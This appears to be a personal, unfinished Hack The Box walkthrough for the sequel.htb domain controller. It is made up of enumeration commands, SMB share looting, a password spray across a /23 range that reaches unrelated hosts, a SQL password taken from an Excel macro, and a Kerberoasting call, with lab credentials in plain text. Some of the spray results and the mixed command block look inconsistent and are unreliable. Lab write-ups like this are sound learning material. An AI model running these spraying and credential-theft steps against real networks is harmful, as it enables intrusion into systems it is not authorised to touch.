


# user txt

### 10.129.48.159

```
  Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
```


As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su


We enumerate the services in the target:

```
sudo nmap -sV -sC ~ip -Pn --top-ports 10000
```

Output:

```
ot shown: 8362 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-31 13:06:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.118.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-31T13:05:43
|_Not valid after:  2055-01-31T13:05:43
| ms-sql-info: 
|   10.129.118.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m05s, deviation: 0s, median: 4m04s
| smb2-time: 
|   date: 2025-01-31T13:07:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```


We enumerate users and password policy with:

```
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --users
```

We save the output as users.txt: 

```
Administrator
Guest
krbtgt
ryan
oscar
sql_svc
rose
ca_svc
```

We enumerate users and password policy with:

```
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --pass-pol
```

Output: 

```
SMB         10.129.48.159  445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.129.48.159 445    DC01             Reset Account Lockout Counter: 10 minutes 
SMB        10.129.48.159  445    DC01             Locked Account Duration: 10 minutes 
SMB         10.129.48.159  445    DC01             Account Lockout Threshold: None
SMB         10.129.48.159  445    DC01             Forced Log off Time: Not Set

```

We enumerate shares in 

```
crackmapexec smb 10.129.48.159 -u rose -p KxEPkKe6R8su --shares
```

And we connect to the existing shares. After browsing around we will download two files:

```
smbclient  \\\\10.129.48.159\\'Accounting Department' -U rose
# Enter password when prompted: KxEPkKe6R8su

dir
get accounting_2024.xlsx
get accounts.xlsx
quit
```

From this files we will extract the following users of the domain that we will save under users2.txt

```
angela@sequel.htb
oscar@sequel.htb
kevin@sequel.htb
sa@sequel.htb
```

Now we will enumerate other machines within the IP range that are accessible with the user rose

```
crackmapexec smb 10.129.48.159/23 -u rose -p KxEPkKe6R8su --local-auth --continue-on-success
```

It returned:

```
SMB         10.129.48.143   445    QUERIER          [+] QUERIER\rose:KxEPkKe6R8su 
```

And also with other users:

```
crackmapexec smb $ip/23 -u ~/borrar/users.txt -p KxEPkKe6R8su -d sequel.htb  --continue-on-success | grep +
```

Output: 

```
10.129.48.92    445    DC               [+] sequel.htb\ryan:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\rose:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\ca_svc:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\angela:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\kevin:KxEPkKe6R8su 
10.129.48.92    445    DC               [+] sequel.htb\sa:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\krbtgt:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\ryan:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\sql_svc:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\rose:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\ca_svc:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\angela:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\kevin:KxEPkKe6R8su 
10.129.48.143   445    QUERIER          [+] sequel.htb\sa:KxEPkKe6R8su 
10.129.48.159   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\krbtgt:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\ryan:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\sql_svc:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\rose:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\ca_svc:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\angela:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\oscar:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\kevin:KxEPkKe6R8su 
10.129.49.239   445    CICADA-DC        [+] sequel.htb\sa:KxEPkKe6R8su 
```



### QUERIER 10.129.48.143 
We will enumerate possible services in this new IP:

```
nmap -sV -sC -Pn 10.129.48.143 --top-ports 10000
```

Output:

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2025-01-31T17:47:20+00:00; +1h04m07s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-31T08:29:34
|_Not valid after:  2055-01-31T08:29:34
| ms-sql-info: 
|   10.129.48.143:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.48.143:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h04m06s, deviation: 0s, median: 1h04m06s
| smb2-time: 
|   date: 2025-01-31T17:47:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

Now we can access enumerate smb shares:

```
crackmapexec smb 10.129.48.143 -u rose -p KxEPkKe6R8su -d QUERIER --shares
```

And now we access the folder:

```
smbclient  \\\\10.129.48.143\\Reports -U rose
```

And we retrieve the file stored there:

```
get Currency Volume Report.xlsm
```

When opening this with proper software, in my case LibreOffice, we can see that there is a macro running. Within the macro there is a stringconnector:

```
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

Let's see 

```
sqsh -S 10.129.48.143 -U QUERIER\\reporting -P 'PcwTWTHRwryjc$c6' -h

./targetedKerberoast.py -d sequel.htb -u rose -p KxEPkKe6R8su -v



master
tempdb
model
msdb
volume   


SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES

SELECT table_name FROM tempdb.INFORMATION_SCHEMA.TABLES

SELECT table_name FROM model.INFORMATION_SCHEMA.TABLES

SELECT table_name FROM msdb.INFORMATION_SCHEMA.TABLES

SELECT table_name FROM volume.INFORMATION_SCHEMA.TABLES


SELECT * FROM backupfile
```